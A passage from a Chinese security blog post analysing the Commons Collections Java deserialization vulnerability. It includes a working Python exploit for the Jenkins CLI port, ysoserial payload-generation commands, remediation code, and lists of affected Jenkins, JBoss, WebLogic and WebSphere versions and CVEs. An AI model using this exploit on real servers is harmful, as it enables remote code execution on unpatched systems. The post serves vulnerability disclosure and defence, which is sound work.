+</span><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://'</span><span class="o">+</span><span class="n">host</span><span class="o">+</span><span class="s">':'</span><span class="o">+</span><span class="n">port</span><span class="p">)</span>
+<span class="n">cli_port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'X-Jenkins-CLI-Port'</span><span class="p">])</span>
+
+<span class="c1">#Open a socket to the CLI port
+</span><span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">cli_port</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">'connecting to </span><span class="si">%</span><span class="s">s port </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">server_address</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server_address</span><span class="p">)</span>
+
+<span class="c1"># Send headers
+</span><span class="n">headers</span><span class="o">=</span><span class="s">'</span><span class="se">\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74</span><span class="s">'</span>
+<span class="k">print</span> <span class="s">'sending "</span><span class="si">%</span><span class="s">s"'</span> <span class="o">%</span> <span class="n">headers</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">headers</span><span class="p">)</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">print</span> <span class="o">&gt;&gt;</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s">'received "</span><span class="si">%</span><span class="s">s"'</span> <span class="o">%</span> <span class="n">data</span>
+
+<span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="k">print</span> <span class="o">&gt;&gt;</span><span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="p">,</span> <span class="s">'received "</span><span class="si">%</span><span class="s">s"'</span> <span class="o">%</span> <span class="n">data</span>
+
+<span class="n">payloadObj</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+<span class="n">payload_b64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payloadObj</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="s">'</span><span class="se">\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e</span><span class="s">'</span><span class="o">+</span><span class="n">payload_b64</span>
+
+<span class="k">print</span> <span class="s">'sending payload...'</span>
+<span class="s">'''outf = open('payload.tmp','w')
+outf.write(payload)
+outf.close()'''</span>
+<span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>
+
+<p>用法为：</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./jenkins.py host port /path/to/payload</code></pre></figure>
+
+<p>该利用脚本模拟了与Jenkins-CLI端口通信的过程，其中payload就是精心构造的<code class="highlighter-rouge">AnnotationInvocationHandler</code>类的序列化字节数据，我们可以使用github上的ysoserial工具进行构造。</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">git clone <span class="nt">--depth</span><span class="o">=</span>50 <span class="nt">--branch</span><span class="o">=</span>master https://github.com/frohoff/ysoserial.git frohoff/ysoserial</code></pre></figure>
+
+<p>进行编译，得到ysoserial-0.0.2-SNAPSHOT-all.jar。</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">mvn <span class="nb">install</span> <span class="nt">-DskipTests</span><span class="o">=</span><span class="nb">true</span> <span class="nt">-Dmaven</span>.javadoc.skip<span class="o">=</span><span class="nb">true</span> <span class="nt">-B</span> –V</code></pre></figure>
+
+<p>生成payload的命令如下：</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">java <span class="nt">-jar</span> ysoserial-0.0.2-SNAPSHOT-all.jar CommonsCollections1 <span class="s1">'touch  /tmp/tmp_test'</span> <span class="o">&gt;</span> tmp_test.ser</code></pre></figure>
+
+<h2 id="0x05-影响与修复">0x05 影响与修复</h2>
+
+<h3 id="apache-commons-collections">Apache Commons Collections</h3>
+
+<p>Apache Commons Collections在3.2.2版本做了一定的安全处理，对这些不安全的Java类的序列化支持增加了开关，默认为关闭状态。涉及的类包括<code class="highlighter-rouge">CloneTransformer</code>, <code class="highlighter-rouge">ForClosure</code>, <code class="highlighter-rouge">InstantiateFactory</code>, <code class="highlighter-rouge">InstantiateTransformer</code>, <code class="highlighter-rouge">InvokerTransformer</code>, <code class="highlighter-rouge">PrototypeCloneFactory</code>, <code class="highlighter-rouge">PrototypeSerializationFactory</code>, <code class="highlighter-rouge">WhileClosure</code>。</p>
+
+<p>如，<code class="highlighter-rouge">InvokerTransformer</code>类重写了序列化相关方法<code class="highlighter-rouge">writeObject()</code>和 <code class="highlighter-rouge">readObject()</code>。</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="n">ObjectOutputStream</span> <span class="n">os</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="n">FunctorUtils</span><span class="o">.</span><span class="na">checkUnsafeSerialization</span><span class="o">(</span><span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="n">os</span><span class="o">.</span><span class="na">defaultWriteObject</span><span class="o">();</span>
+<span class="o">}</span>
+<span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">ObjectInputStream</span> <span class="n">is</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="n">FunctorUtils</span><span class="o">.</span><span class="na">checkUnsafeSerialization</span><span class="o">(</span><span class="n">InvokerTransformer</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+    <span class="n">is</span><span class="o">.</span><span class="na">defaultReadObject</span><span class="o">();</span>
+<span class="o">}</span></code></pre></figure>
+
+<p>如果没有开启不安全类的序列化，则会抛出<em>UnsupportedOperationException</em>异常：</p>
+
+<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">static</span> <span class="kt">void</span> <span class="nf">checkUnsafeSerialization</span><span class="o">(</span><span class="n">Class</span> <span class="n">clazz</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="n">unsafeSerializableProperty</span><span class="o">;</span>
+
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">unsafeSerializableProperty</span> <span class="o">=</span>
+            <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">AccessController</span><span class="o">.</span><span class="na">doPrivileged</span><span class="o">(</span><span class="k">new</span> <span class="n">PrivilegedAction</span><span class="o">()</span> <span class="o">{</span>
+                <span class="kd">public</span> <span class="n">Object</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
+                    <span class="k">return</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="n">UNSAFE_SERIALIZABLE_PROPERTY</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="o">});</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">SecurityException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">unsafeSerializableProperty</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="k">if</span> <span class="o">(!</span><span class="s">"true"</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">unsafeSerializableProperty</span><span class="o">))</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">UnsupportedOperationException</span><span class="o">(</span>
+                <span class="s">"Serialization support for "</span> <span class="o">+</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span> <span class="o">+</span> <span class="s">" is disabled for security reasons. "</span> <span class="o">+</span>
+                <span class="s">"To enable it set system property '"</span> <span class="o">+</span> <span class="n">UNSAFE_SERIALIZABLE_PROPERTY</span> <span class="o">+</span> <span class="s">"' to 'true', "</span> <span class="o">+</span>
+                <span class="s">"but you must ensure that your application does not de-serialize objects from untrusted sources."</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span></code></pre></figure>
+
+<h3 id="jenkins">Jenkins</h3>
+
+<p>Jenkins 发布了安全公告，并且在1.638版本中修复了这个漏洞。</p>
+
+<h3 id="jboss">JBoss</h3>
+
+<p>RedHat发布JBoss相关产品的<a href="https://access.redhat.com/solutions/2045023" target="_blank">解决方案</a>，受影响的JBoss产品有：</p>
+
+<ul>
+  <li>Red Hat JBoss A-MQ 6.x</li>
+  <li>Red Hat JBoss BPM Suite (BPMS) 6.x</li>
+  <li>Red Hat JBoss BRMS 6.x</li>
+  <li>Red Hat JBoss BRMS 5.x</li>
+  <li>Red Hat JBoss Data Grid (JDG) 6.x</li>
+  <li>Red Hat JBoss Data Virtualization (JDV) 6.x</li>
+  <li>Red Hat JBoss Data Virtualization (JDV) 5.x</li>
+  <li>Red Hat JBoss Enterprise Application Platform 6.x</li>
+  <li>Red Hat JBoss Enterprise Application Platform 5.x</li>
+  <li>Red Hat JBoss Enterprise Application Platform 4.3.x</li>
+  <li>Red Hat JBoss Fuse 6.x</li>
+  <li>Red Hat JBoss Fuse Service Works (FSW) 6.x</li>
+  <li>Red Hat JBoss Operations Network (JBoss ON) 3.x</li>
+  <li>Red Hat JBoss Portal 6.x</li>
+  <li>Red Hat JBoss SOA Platform (SOA-P) 5.x</li>
+  <li>Red Hat JBoss Web Server (JWS) 3.x</li>
+</ul>
+
+<h3 id="weblogic">Weblogic</h3>
+
+<p>Oracle也发布了<a href="http://www.oracle.com/technetwork/topics/security/alert-cve-2015-4852-2763333.html" target="_blank">安全告警</a>,影响版本包括 <em>Oracle WebLogic Server</em></p>
+
+<ul>
+  <li>Version 10.3.6.0</li>
+  <li>Version 12.1.2.0</li>
+  <li>Version 12.1.3.0</li>
+  <li>Version 12.2.1.0</li>
+</ul>
+
+<h3 id="websphere">Websphere</h3>
+
+<p>IBM发布了Websphere<a href="http://www-01.ibm.com/support/docview.wss?uid=swg21970575" target="_blank">安全公告</a>，受影响的 WebSphere Application Server 和 IBM WebSphere Application Server Hypervisor Edition 版本有:</p>
+
+<ul>
+  <li>Version 8.5 and 8.5.5 Full Profile and Liberty Profile</li>
+  <li>Version 8.0</li>
+  <li>Version 7.0</li>
+</ul>
+
+<h2 id="0x06-相关cve">0x06 相关CVE</h2>
+
+<ul>
+  <li>CVE-2015-7501</li>
+  <li>CVE-2015-4852 (Weblogic)</li>
+  <li>CVE-2015-7450 (Websphere)</li>
+</ul>
+
+<h2 id="0x07-参考资料">0x07 参考资料</h2>
+
+<p>foxglovesec blog</p>
+
+<p>foxglovesec exploit</p>
+
+<p>Apache Commons Collections Issue</p>
+
+<p>appseccali-2015-marshalling-pickles</p>
+
+<p>Red Hat JBoss products solution</p>
+
+<p><br /><br /></p>
+
+<p><em>Posted on <a href="http://security.tencent.com/blog/msg/97">http://security.tencent.com/blog/msg/97</a></em></p>
+
+      <footer class="entry-meta">
+        <span class="entry-tags" style="color:black;font-size:13px;margin-bottom: 0px;">欢迎订阅我的微信公众号</span>
+        <img src="/images/secengine.jpg" alt="welcome subscribe"/>
+        <span class="entry-tags"><a href="https://kingx.me/tags/#java" title="Pages tagged java" class="tag"><span class="term">java</span></a><a href="https://kingx.me/tags/#unserialize" title="Pages tagged unserialize" class="tag"><span class="term">unserialize</span></a><a href="https://kingx.me/tags/#exploit" title="Pages tagged exploit" class="tag"><span class="term">exploit</span></a></span>
+        
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="weibo"><a href="http://service.weibo.com/share/share.php?title=分享KINGX的文章《Commons Collections Java反序列化漏洞深入分析》&url=https://kingx.me/commons-collections-java-deserialization.html&source=bookmark" title="Share on Weibo" target="_blank"><span class="count"><i class="fa fa-weibo"></i> WEIBO</span></a></li>
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://kingx.me/commons-collections-java-deserialization.html" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://kingx.me/commons-collections-java-deserialization.html" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://kingx.me/commons-collections-java-deserialization.html" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+<!--
+<div class="ds-share" data-thread-key="/commons-collections-java-deserialization" data-title="Commons Collections Java反序列化漏洞深入分析" data-images="" data-content="Commons Collections Java反序列化漏洞深入分析" data-url="https://kingx.me/commons-collections-java-deserialization.html">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+        <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+</div>
+-->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    
+
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      
+        <a href="https://kingx.me/hack-the-driver-courses.html" class="read-more-btn">Read More</a>
+      
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      
+      <h3><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" title="如何绕过高版本JDK的限制进行JNDI注入利用">如何绕过高版本JDK的限制进行JNDI注入利用</a></h3>
+      <p>Restrictions of JNDI Manipulation RCE & Bypass <a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">Continue reading</a></p>
+      
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/Thinking-about-Red-Teaming.html" title="【红蓝对抗】大型互联网企业安全蓝军建设">【红蓝对抗】大型互联网企业安全蓝军建设</a></h4>
+        <span>Published on March 12, 2019</span>
+      </div><!-- /.list-item -->
+      
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/CobaltStrike-Patch.html" title="内网渗透有它就够了，手把手教你分析CobaltStrike3.12">内网渗透有它就够了，手把手教你分析CobaltStrike3.12</a></h4>
+        <span>Published on November 19, 2018</span>
+      </div><!-- /.list-item -->
+      
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2019 KINGX. Powered by Jekyll using the HPSTR Theme.</span>
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>-->
+<!-- <script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://kingx.me/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://kingx.me/assets/js/scripts.min.js"></script>
+
+
+
+
+<script>
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  if(location.host=="kingx.me"){
+    hm.src = "https://hm.baidu.com/hm.js?d11d8512e0bc6992b9c9bbf2d266ce31";
+  }else if(location.host=="kingx.sinaapp.com"){
+    hm.src = "https://hm.baidu.com/hm.js?d1b3dbd97b73868454f102755fdf51ba";
+  }
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Busuanzi Analytics -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+	        
+
+</body>
+</html>
